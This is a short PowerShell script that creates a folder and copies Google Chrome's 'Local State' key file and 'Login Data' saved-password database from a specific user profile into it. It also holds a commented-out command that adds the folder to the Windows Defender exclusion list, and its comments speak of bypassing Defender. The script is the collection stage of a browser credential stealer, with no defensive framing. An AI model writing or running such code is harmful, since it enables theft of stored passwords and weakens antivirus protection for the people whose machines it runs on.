# Define the folder path to be created and added to the exclusion list
$folderPath = "C:\Junk"  

# Create the folder
New-Item -ItemType Directory -Path $folderPath -Force

# Add the folder path to the Windows Defender exclusion list
#Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction Stop

# Define the source paths
$localStatePath = "C:\Users\wblac\AppData\Local\Google\Chrome\User Data\Local State"
$loginDataPath = "C:\Users\wblac\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Define the destination path
$destinationFolder = "C:\Junk"  # Change this to your desired destination

# Copy the folders to the destination without errors and bypassing Windows Defender
try {
    Copy-Item -Path $localStatePath -Destination $destinationFolder -Recurse -Force -ErrorAction Stop
    Copy-Item -Path $loginDataPath -Destination $destinationFolder -Recurse -Force -ErrorAction Stop
}
catch {
    Write-Host "An error occurred: $_"
}
